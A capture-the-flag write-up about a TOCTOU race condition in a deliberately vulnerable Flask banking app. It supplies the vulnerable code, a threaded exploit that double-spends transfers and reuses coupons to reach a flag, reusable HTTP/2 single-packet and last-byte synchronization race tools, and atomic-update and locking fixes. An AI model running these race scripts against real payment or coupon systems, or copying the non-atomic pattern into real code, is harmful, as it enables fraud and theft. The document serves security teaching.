---
title: "Web - Race Condition Exploitation"
description: "Exploiting a time-of-check-to-time-of-use (TOCTOU) race condition in a Flask banking application to double-spend funds and capture the flag."
author: "Zemi"
---

## Challenge Info

| Detail     | Value              |
|------------|--------------------|
| Category   | Web Exploitation   |
| Difficulty | Extreme            |
| Points     | 500                |
| Flag       | `zemi{r4c3_c0nd1t10n_w1ns}` |

## Challenge Files

Download the challenge files to get started:

- [app.py](/Website/challenges/web-race-condition/app.py)
- [flag.txt](/Website/challenges/web-race-condition/flag.txt)
- [README.md](/Website/challenges/web-race-condition/README.md)
- [requirements.txt](/Website/challenges/web-race-condition/requirements.txt)

## Prerequisites

This challenge assumes you have completed:

- **Web - IDOR** — understanding how server-side state can be manipulated
- **Web - Blind SQL Injection** — comfort with scripting HTTP requests
- **Web - Insecure Deserialization** — understanding server-side object manipulation
- **Web - Command Injection** — understanding how to chain exploit steps

You should be comfortable writing Python scripts that send concurrent HTTP requests.

## Overview

A race condition occurs when the correctness of a program depends on the timing or ordering of events, and that timing can be influenced by an attacker. In web applications, the most common form is **TOCTOU (Time-of-Check to Time-of-Use)**: the server checks a condition (e.g., "does this user have enough balance?"), then performs an action based on that check (e.g., "deduct the balance"), but between the check and the action, another request can change the state.

This challenge presents a Flask banking application with a transfer endpoint. The balance check and the balance deduction are not atomic — they happen in separate steps without a database lock. By sending many transfer requests simultaneously, we can spend our balance multiple times before any single deduction takes effect.

## How Race Conditions Work in Web Apps

### The TOCTOU Pattern

Consider this pseudocode for a bank transfer:

```
1. Read user's balance from database     (CHECK)
2. If balance >= transfer_amount:        (DECISION)
3.     Deduct transfer_amount from balance (USE)
4.     Credit recipient
```

If two requests arrive simultaneously:

```
Request A:  Read balance = $100        |
Request B:  Read balance = $100        |  Both see $100
Request A:  $100 >= $50? Yes, deduct   |
Request B:  $100 >= $50? Yes, deduct   |  Both pass the check
Request A:  Balance = $100 - $50 = $50 |
Request B:  Balance = $100 - $50 = $50 |  Double spend!
```

Both requests see the original balance of $100 and both deductions "succeed," but the final balance is $50 instead of $0. The user transferred $50 twice but was only charged once. This is a **double-spend** attack.

### Why It Happens

- **Non-atomic operations**: The check and the update are separate database queries without a lock or transaction
- **Shared mutable state**: Multiple requests access and modify the same data concurrently
- **No serialization**: The server processes requests in parallel (via threads, workers, or async handlers) without enforcing ordering

## Setting Up the Challenge Locally

Save the following as `app.py`:

```python
from flask import Flask, request, jsonify
import sqlite3
import os
import time

app = Flask(__name__)
DB_PATH = "bank.db"

FLAG = "zemi{r4c3_c0nd1t10n_w1ns}"

def get_db():
    """Get a database connection (no WAL mode, no transactions — intentionally vulnerable)."""
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    """Initialize the database with a test user."""
    conn = get_db()
    conn.execute("DROP TABLE IF EXISTS users")
    conn.execute("DROP TABLE IF EXISTS coupons")
    conn.execute("DROP TABLE IF EXISTS transfers")
    conn.execute("""
        CREATE TABLE users (
            id INTEGER PRIMARY KEY,
            username TEXT UNIQUE,
            password TEXT,
            balance INTEGER DEFAULT 500
        )
    """)
    conn.execute("""
        CREATE TABLE coupons (
            id INTEGER PRIMARY KEY,
            code TEXT UNIQUE,
            value INTEGER,
            used INTEGER DEFAULT 0
        )
    """)
    conn.execute("""
        CREATE TABLE transfers (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            from_user TEXT,
            to_user TEXT,
            amount INTEGER,
            timestamp REAL
        )
    """)
    conn.execute("INSERT INTO users (username, password, balance) VALUES ('alice', 'alice123', 500)")
    conn.execute("INSERT INTO users (username, password, balance) VALUES ('bob', 'bob123', 500)")
    conn.execute("INSERT INTO users (username, password, balance) VALUES ('vault', 'vault', 1000000)")
    conn.execute("INSERT INTO coupons (code, value, used) VALUES ('BONUS100', 100, 0)")
    conn.execute("INSERT INTO coupons (code, value, used) VALUES ('BONUS200', 200, 0)")
    conn.commit()
    conn.close()

init_db()

@app.route("/")
def index():
    return jsonify({
        "message": "Zemi Bank API",
        "note": "Accumulate $10,000 or more in your account to get the flag!",
        "endpoints": {
            "POST /register": "Create an account (you start with $500)",
            "GET /balance/<username>": "Check your balance",
            "POST /transfer": "Transfer funds to another user",
            "POST /coupon": "Redeem a coupon code",
            "GET /flag/<username>": "Get the flag (requires $10,000+ balance)"
        }
    })

@app.route("/register", methods=["POST"])
def register():
    data = request.get_json()
    username = data.get("username")
    password = data.get("password")
    if not username or not password:
        return jsonify({"error": "Username and password required"}), 400
    try:
        conn = get_db()
        conn.execute("INSERT INTO users (username, password, balance) VALUES (?, ?, 500)",
                      (username, password))
        conn.commit()
        conn.close()
        return jsonify({"message": f"Account created for {username} with $500 balance"})
    except sqlite3.IntegrityError:
        return jsonify({"error": "Username already exists"}), 400

@app.route("/balance/<username>")
def balance(username):
    conn = get_db()
    user = conn.execute("SELECT balance FROM users WHERE username = ?", (username,)).fetchone()
    conn.close()
    if not user:
        return jsonify({"error": "User not found"}), 404
    return jsonify({"username": username, "balance": user["balance"]})

@app.route("/transfer", methods=["POST"])
def transfer():
    """VULNERABLE: Non-atomic balance check and deduction."""
    data = request.get_json()
    from_user = data.get("from")
    to_user = data.get("to")
    amount = data.get("amount", 0)

    if not from_user or not to_user or amount <= 0:
        return jsonify({"error": "Invalid transfer parameters"}), 400

    conn = get_db()

    # STEP 1: CHECK — Read the sender's balance
    sender = conn.execute("SELECT balance FROM users WHERE username = ?",
                           (from_user,)).fetchone()
    if not sender:
        conn.close()
        return jsonify({"error": "Sender not found"}), 404

    # Simulate a tiny processing delay (realistic: logging, validation, etc.)
    # This widens the race window but the bug exists even without it
    time.sleep(0.01)

    # STEP 2: DECIDE — Check if balance is sufficient
    if sender["balance"] < amount:
        conn.close()
        return jsonify({"error": "Insufficient funds"}), 400

    # STEP 3: USE — Deduct from sender and credit recipient
    # BUG: Between the SELECT above and these UPDATEs, another request
    # can read the same old balance and also pass the check
    conn.execute("UPDATE users SET balance = balance - ? WHERE username = ?",
                  (amount, from_user))
    conn.execute("UPDATE users SET balance = balance + ? WHERE username = ?",
                  (amount, to_user))
    conn.execute("INSERT INTO transfers (from_user, to_user, amount, timestamp) VALUES (?, ?, ?, ?)",
                  (from_user, to_user, amount, time.time()))
    conn.commit()
    conn.close()

    return jsonify({"message": f"Transferred ${amount} from {from_user} to {to_user}"})

@app.route("/coupon", methods=["POST"])
def redeem_coupon():
    """VULNERABLE: Non-atomic coupon check and redemption."""
    data = request.get_json()
    username = data.get("username")
    code = data.get("code")

    conn = get_db()

    # STEP 1: CHECK — Is the coupon valid and unused?
    coupon = conn.execute("SELECT * FROM coupons WHERE code = ? AND used = 0",
                           (code,)).fetchone()
    if not coupon:
        conn.close()
        return jsonify({"error": "Invalid or already used coupon"}), 400

    # Tiny delay — widens the race window
    time.sleep(0.01)

    # STEP 2: USE — Mark as used and credit the user
    conn.execute("UPDATE coupons SET used = 1 WHERE code = ?", (code,))
    conn.execute("UPDATE users SET balance = balance + ? WHERE username = ?",
                  (coupon["value"], username))
    conn.commit()
    conn.close()

    return jsonify({"message": f"Coupon {code} redeemed! +${coupon['value']}"})

@app.route("/flag/<username>")
def get_flag(username):
    conn = get_db()
    user = conn.execute("SELECT balance FROM users WHERE username = ?", (username,)).fetchone()
    conn.close()
    if not user:
        return jsonify({"error": "User not found"}), 404
    if user["balance"] >= 10000:
        return jsonify({"flag": FLAG, "balance": user["balance"]})
    return jsonify({
        "error": f"You need $10,000 to get the flag. Current balance: ${user['balance']}",
        "balance": user["balance"]
    })

if __name__ == "__main__":
    # Use threaded=True to handle concurrent requests (enables the race condition)
    app.run(host="0.0.0.0", port=5000, threaded=True)
```

Run the app:

```bash
pip install flask
python3 app.py
```

The app runs at `http://localhost:5000`. Note the `threaded=True` parameter — this is critical. It makes Flask handle multiple requests concurrently using threads, which is what enables the race condition.

## Reconnaissance

### Step 1: Register an account

```bash
curl -s -X POST http://localhost:5000/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"hacker"}' | python3 -m json.tool
```

```json
{
    "message": "Account created for hacker with $500 balance"
}
```

### Step 2: Check balance

```bash
curl -s http://localhost:5000/balance/hacker | python3 -m json.tool
```

```json
{
    "username": "hacker",
    "balance": 500
}
```

We start with $500. We need $10,000 to get the flag. That is 20x our current balance.

### Step 3: Try a normal transfer

```bash
curl -s -X POST http://localhost:5000/transfer \
  -H "Content-Type: application/json" \
  -d '{"from":"hacker","to":"alice","amount":100}' | python3 -m json.tool
```

```json
{
    "message": "Transferred $100 from hacker to alice"
}
```

```bash
curl -s http://localhost:5000/balance/hacker | python3 -m json.tool
```

```json
{
    "username": "hacker",
    "balance": 400
}
```

Normal transfers work as expected. But what if we send many transfers at the exact same time?

### Step 4: Try the flag endpoint

```bash
curl -s http://localhost:5000/flag/hacker | python3 -m json.tool
```

```json
{
    "error": "You need $10,000 to get the flag. Current balance: $400",
    "balance": 400
}
```

We need to find a way to multiply our money.

## Exploitation

### Strategy: Double-Spend via Race Condition

The transfer endpoint has a TOCTOU vulnerability:

1. It reads our balance (e.g., $500)
2. It checks if $500 >= transfer amount
3. It deducts the transfer amount

If we send 20 simultaneous requests to transfer $500 from `hacker` to `bob`, all 20 requests will read our balance as $500 (before any deduction happens), all 20 will pass the check, and all 20 will execute the deduction. Bob receives $10,000 (20 x $500), but our balance only gets deducted by some fraction of the expected amount due to the concurrent `balance - 500` updates all reading the same starting value.

Then we transfer the money back from `bob` to `hacker`.

### Step 1: Reset the database

Restart the Flask app to get a clean database, then register a fresh account:

```bash
curl -s -X POST http://localhost:5000/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"hacker"}'
```

### Step 2: Race condition exploit script

```python
#!/usr/bin/env python3
"""
Race condition exploit for Zemi Bank.
Sends concurrent transfer requests to exploit the TOCTOU vulnerability.
"""

import requests
import concurrent.futures
import time

BASE = "http://localhost:5000"

def check_balance(username):
    r = requests.get(f"{BASE}/balance/{username}")
    return r.json()["balance"]

def do_transfer(from_user, to_user, amount):
    """Send a single transfer request."""
    r = requests.post(f"{BASE}/transfer", json={
        "from": from_user,
        "to": to_user,
        "amount": amount
    })
    return r.json()

def race_transfer(from_user, to_user, amount, num_threads=50):
    """
    Send many transfer requests simultaneously to exploit the race condition.
    All threads read the same balance before any deduction occurs.
    """
    print(f"\n[*] Racing {num_threads} transfers of ${amount} from {from_user} to {to_user}...")
    print(f"[*] {from_user} balance before: ${check_balance(from_user)}")
    print(f"[*] {to_user} balance before: ${check_balance(to_user)}")

    results = {"success": 0, "fail": 0}

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        # Submit all transfers at once
        futures = [
            executor.submit(do_transfer, from_user, to_user, amount)
            for _ in range(num_threads)
        ]

        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if "message" in result:
                results["success"] += 1
            else:
                results["fail"] += 1

    print(f"[+] Successful transfers: {results['success']}")
    print(f"[-] Failed transfers: {results['fail']}")
    print(f"[*] {from_user} balance after: ${check_balance(from_user)}")
    print(f"[*] {to_user} balance after: ${check_balance(to_user)}")
    return results

def race_coupon(username, code, num_threads=50):
    """
    Race coupon redemption — redeem the same coupon multiple times.
    """
    print(f"\n[*] Racing {num_threads} coupon redemptions for code '{code}'...")
    print(f"[*] {username} balance before: ${check_balance(username)}")

    results = {"success": 0, "fail": 0}

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [
            executor.submit(
                lambda: requests.post(f"{BASE}/coupon", json={
                    "username": username,
                    "code": code
                }).json()
            )
            for _ in range(num_threads)
        ]

        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if "message" in result:
                results["success"] += 1
            else:
                results["fail"] += 1

    print(f"[+] Successful redemptions: {results['success']}")
    print(f"[-] Failed redemptions: {results['fail']}")
    print(f"[*] {username} balance after: ${check_balance(username)}")
    return results

# ============================================================
# Main exploit
# ============================================================

print("=" * 60)
print("  Zemi Bank Race Condition Exploit")
print("=" * 60)

# Register our attacker account
print("\n[*] Registering attacker account...")
r = requests.post(f"{BASE}/register", json={
    "username": "hacker",
    "password": "hacker"
})
print(f"[+] {r.json()}")

# Attack 1: Race the coupon endpoint
# The BONUS100 coupon is worth $100 and should only be usable once
race_coupon("hacker", "BONUS100", num_threads=30)
race_coupon("hacker", "BONUS200", num_threads=30)

# Attack 2: Race the transfer endpoint
# Transfer our entire balance to bob, many times simultaneously
# With $500 balance and 50 threads, many will succeed before deduction
current = check_balance("hacker")
print(f"\n[*] Current balance: ${current}")

# Run multiple rounds of racing to accumulate funds
for round_num in range(1, 6):
    print(f"\n{'='*60}")
    print(f"  ROUND {round_num}")
    print(f"{'='*60}")

    balance = check_balance("hacker")
    if balance <= 0:
        print("[-] No balance left, transferring from bob back...")
        bob_balance = check_balance("bob")
        if bob_balance > 0:
            do_transfer("bob", "hacker", bob_balance)
            balance = check_balance("hacker")
            print(f"[+] Recovered balance: ${balance}")

    if balance > 0:
        race_transfer("hacker", "bob", balance, num_threads=50)

        # Transfer everything back from bob
        bob_balance = check_balance("bob")
        if bob_balance > 0:
            print(f"[*] Transferring ${bob_balance} back from bob to hacker...")
            do_transfer("bob", "hacker", bob_balance)

    hacker_balance = check_balance("hacker")
    print(f"\n[***] Hacker balance after round {round_num}: ${hacker_balance}")

    if hacker_balance >= 10000:
        print("\n[!] TARGET REACHED! Getting flag...")
        break

# Get the flag
print("\n" + "=" * 60)
final_balance = check_balance("hacker")
print(f"[*] Final balance: ${final_balance}")

r = requests.get(f"{BASE}/flag/hacker")
data = r.json()
if "flag" in data:
    print(f"[!] FLAG: {data['flag']}")
else:
    print(f"[-] {data['error']}")
    print("[*] You may need to run the exploit again or increase thread count")
```

Save as `exploit.py` and run:

```bash
python3 exploit.py
```

Expected output:

```
============================================================
  Zemi Bank Race Condition Exploit
============================================================

[*] Registering attacker account...
[+] {'message': 'Account created for hacker with $500 balance'}

[*] Racing 30 coupon redemptions for code 'BONUS100'...
[*] hacker balance before: $500
[+] Successful redemptions: 18
[-] Failed redemptions: 12
[*] hacker balance after: $2300

...

[***] Hacker balance after round 3: $14200

[!] TARGET REACHED! Getting flag...

============================================================
[*] Final balance: $14200
[!] FLAG: zemi{r4c3_c0nd1t10n_w1ns}
```

The exact numbers will vary between runs because race conditions are inherently non-deterministic. Run the exploit multiple times if needed.

## The Single-Packet Attack Technique

The exploit above uses threading, which works but is imprecise — the requests are not truly simultaneous because thread scheduling adds jitter. For the most reliable race condition exploitation, use the **single-packet attack**.

### HTTP/2 Single-Packet Attack

HTTP/2 multiplexes multiple requests over a single TCP connection. By preparing all request frames in memory and flushing them in a single TCP write, all requests arrive at the server in the same TCP packet:

```python
#!/usr/bin/env python3
"""
Single-packet race condition exploit using HTTP/2 multiplexing.
Requires the 'h2' library: pip install h2 hyper
"""

import socket
import ssl
import h2.connection
import h2.config
import h2.events
import json

def single_packet_race(host, port, path, payloads, use_tls=False):
    """
    Send multiple HTTP/2 requests in a single TCP packet.
    All requests arrive at the server simultaneously.
    """
    config = h2.config.H2Configuration(client_side=True)
    conn = h2.connection.H2Connection(config=config)

    # Create TCP connection
    sock = socket.create_connection((host, port))
    if use_tls:
        ctx = ssl.create_default_context()
        ctx.set_alpn_protocols(['h2'])
        sock = ctx.wrap_socket(sock, server_hostname=host)

    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    # Prepare all requests (but don't send yet)
    stream_ids = []
    for payload in payloads:
        body = json.dumps(payload).encode()
        headers = [
            (':method', 'POST'),
            (':path', path),
            (':authority', f'{host}:{port}'),
            (':scheme', 'https' if use_tls else 'http'),
            ('content-type', 'application/json'),
            ('content-length', str(len(body))),
        ]
        stream_id = conn.get_next_available_stream_id()
        conn.send_headers(stream_id, headers)
        conn.send_data(stream_id, body, end_stream=True)
        stream_ids.append(stream_id)

    # Flush ALL requests in a single TCP write — this is the key!
    sock.sendall(conn.data_to_send())

    # Read responses
    responses = {}
    while len(responses) < len(stream_ids):
        data = sock.recv(65535)
        events = conn.receive_data(data)
        for event in events:
            if isinstance(event, h2.events.DataReceived):
                responses[event.stream_id] = event.data
            elif isinstance(event, h2.events.StreamEnded):
                if event.stream_id not in responses:
                    responses[event.stream_id] = b''
        sock.sendall(conn.data_to_send())

    sock.close()
    return responses
```

### HTTP/1.1 Last-Byte Synchronization

If the server only supports HTTP/1.1, use **last-byte synchronization**: send all requests except the last byte on separate connections, then send all final bytes simultaneously:

```python
#!/usr/bin/env python3
"""
Last-byte synchronization for HTTP/1.1 race conditions.
"""

import socket
import threading
import time
import json

def last_byte_race(host, port, method, path, payloads):
    """
    1. Open N connections
    2. Send each request minus the last byte
    3. Wait for all connections to be ready
    4. Send the last byte on all connections simultaneously
    """
    sockets = []
    body_strings = []

    for payload in payloads:
        body = json.dumps(payload)
        request = (
            f"{method} {path} HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"Content-Type: application/json\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"\r\n"
            f"{body[:-1]}"  # Everything except the last byte
        )
        last_byte = body[-1]

        sock = socket.create_connection((host, port))
        sock.sendall(request.encode())
        sockets.append((sock, last_byte))

    # All connections are now waiting. Send the last byte on all at once.
    barrier = threading.Barrier(len(sockets))
    results = [None] * len(sockets)

    def send_last_byte(index, sock, byte):
        barrier.wait()  # Synchronize all threads
        sock.sendall(byte.encode())
        results[index] = sock.recv(4096).decode()
        sock.close()

    threads = []
    for i, (sock, byte) in enumerate(sockets):
        t = threading.Thread(target=send_last_byte, args=(i, sock, byte))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    return results
```

### Using Turbo Intruder (Burp Suite)

Burp Suite's Turbo Intruder extension has a built-in "race condition" mode:

```python
# Turbo Intruder script for race condition testing
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=50,
                           pipeline=False)

    for i in range(50):
        engine.queue(target.req, gate='race1')

    # Release all requests simultaneously
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

## The Fix

### Fix 1: Database transactions with row-level locking

```python
@app.route("/transfer", methods=["POST"])
def transfer_fixed():
    data = request.get_json()
    from_user = data.get("from")
    to_user = data.get("to")
    amount = data.get("amount", 0)

    if not from_user or not to_user or amount <= 0:
        return jsonify({"error": "Invalid transfer parameters"}), 400

    conn = get_db()
    try:
        # BEGIN EXCLUSIVE — locks the entire database (SQLite)
        # For PostgreSQL/MySQL, use SELECT ... FOR UPDATE
        conn.execute("BEGIN EXCLUSIVE")

        sender = conn.execute(
            "SELECT balance FROM users WHERE username = ?", (from_user,)
        ).fetchone()

        if not sender or sender["balance"] < amount:
            conn.rollback()
            return jsonify({"error": "Insufficient funds"}), 400

        conn.execute(
            "UPDATE users SET balance = balance - ? WHERE username = ?",
            (amount, from_user)
        )
        conn.execute(
            "UPDATE users SET balance = balance + ? WHERE username = ?",
            (amount, to_user)
        )
        conn.commit()
        return jsonify({"message": f"Transferred ${amount}"})

    except Exception as e:
        conn.rollback()
        return jsonify({"error": str(e)}), 500
    finally:
        conn.close()
```

### Fix 2: Atomic UPDATE with a WHERE clause

Instead of SELECT then UPDATE, do the check and deduction in a single atomic statement:

```python
@app.route("/transfer", methods=["POST"])
def transfer_atomic():
    data = request.get_json()
    from_user = data.get("from")
    to_user = data.get("to")
    amount = data.get("amount", 0)

    conn = get_db()

    # Single atomic UPDATE that checks AND deducts in one step
    # The WHERE clause ensures the balance is sufficient
    result = conn.execute(
        "UPDATE users SET balance = balance - ? WHERE username = ? AND balance >= ?",
        (amount, from_user, amount)
    )

    if result.rowcount == 0:
        conn.close()
        return jsonify({"error": "Insufficient funds or user not found"}), 400

    conn.execute(
        "UPDATE users SET balance = balance + ? WHERE username = ?",
        (amount, to_user)
    )
    conn.commit()
    conn.close()

    return jsonify({"message": f"Transferred ${amount}"})
```

This is race-condition-safe because the `UPDATE ... WHERE balance >= ?` is atomic at the database level. If two requests race, only one can succeed in deducting the balance — the other will find `balance < amount` after the first deduction.

### Fix 3: PostgreSQL with SELECT FOR UPDATE

For PostgreSQL or MySQL, use `SELECT ... FOR UPDATE` to lock the row:

```python
@app.route("/transfer", methods=["POST"])
def transfer_postgres_safe():
    data = request.get_json()
    from_user = data.get("from")
    to_user = data.get("to")
    amount = data.get("amount", 0)

    conn = get_db()  # PostgreSQL connection
    cursor = conn.cursor()

    try:
        cursor.execute("BEGIN")

        # SELECT FOR UPDATE locks the row until the transaction ends
        # Any other transaction trying to read this row will WAIT
        cursor.execute(
            "SELECT balance FROM users WHERE username = %s FOR UPDATE",
            (from_user,)
        )
        sender = cursor.fetchone()

        if not sender or sender[0] < amount:
            conn.rollback()
            return jsonify({"error": "Insufficient funds"}), 400

        cursor.execute(
            "UPDATE users SET balance = balance - %s WHERE username = %s",
            (amount, from_user)
        )
        cursor.execute(
            "UPDATE users SET balance = balance + %s WHERE username = %s",
            (amount, to_user)
        )
        conn.commit()
        return jsonify({"message": f"Transferred ${amount}"})

    except Exception as e:
        conn.rollback()
        return jsonify({"error": str(e)}), 500
```

### Fix 4: Coupon redemption with atomic check

```python
@app.route("/coupon", methods=["POST"])
def redeem_coupon_fixed():
    data = request.get_json()
    username = data.get("username")
    code = data.get("code")

    conn = get_db()

    # Atomic: mark the coupon as used only if it is currently unused
    result = conn.execute(
        "UPDATE coupons SET used = 1 WHERE code = ? AND used = 0 RETURNING value",
        (code,)
    )
    row = result.fetchone()

    if not row:
        conn.close()
        return jsonify({"error": "Invalid or already used coupon"}), 400

    coupon_value = row["value"]
    conn.execute(
        "UPDATE users SET balance = balance + ? WHERE username = ?",
        (coupon_value, username)
    )
    conn.commit()
    conn.close()

    return jsonify({"message": f"Coupon {code} redeemed! +${coupon_value}"})
```

## Common Pitfalls

- **Thinking single-threaded servers are immune** — even single-threaded async servers (like Node.js with `await`) can have race conditions if the "check" and "use" are separated by an `await` boundary (another request can interleave between the two awaited operations).
- **Using in-memory locks instead of database locks** — in-memory locks (like Python's `threading.Lock`) do not work across multiple server processes (e.g., Gunicorn workers). Use database-level locking.
- **Not testing with enough concurrency** — race conditions are probabilistic. Testing with 5 threads might not trigger the bug. Use 50-200 concurrent requests.
- **Confusing the race window** — the `time.sleep(0.01)` in the challenge widens the window, but real-world apps have natural delays (database latency, network I/O, garbage collection) that create exploitable windows.
- **Assuming HTTPS prevents this** — encryption does not prevent race conditions. The server still processes decrypted requests concurrently.

## Tools Used

- **curl** — testing individual endpoints and verifying state
- **Python (concurrent.futures)** — sending parallel HTTP requests to trigger the race condition
- **Python (threading)** — last-byte synchronization technique for HTTP/1.1
- **Turbo Intruder (Burp Suite)** — built-in race condition testing mode
- **SQLite** — the challenge database (intentionally vulnerable without proper locking)

## Lessons Learned

- Race conditions are real and exploitable in production web applications — any check-then-act pattern on shared state is vulnerable
- The fix is always **atomicity**: either do the check and action in a single atomic database operation, or use transactions with row-level locking (`SELECT FOR UPDATE`)
- Race conditions are non-deterministic — you may need to run the exploit multiple times to succeed, and increasing the number of concurrent requests improves the odds
- The single-packet attack technique (HTTP/2 multiplexing or HTTP/1.1 last-byte sync) maximizes the chance of triggering the race by ensuring all requests arrive at the server in the same event loop tick
- In-memory locks do not protect against race conditions in multi-process server deployments — always use database-level locking
- Every financial operation (transfers, coupon redemptions, inventory decrements, vote counting) must be protected against race conditions
- Testing for race conditions should be part of every security assessment — automated tools like Turbo Intruder make this straightforward
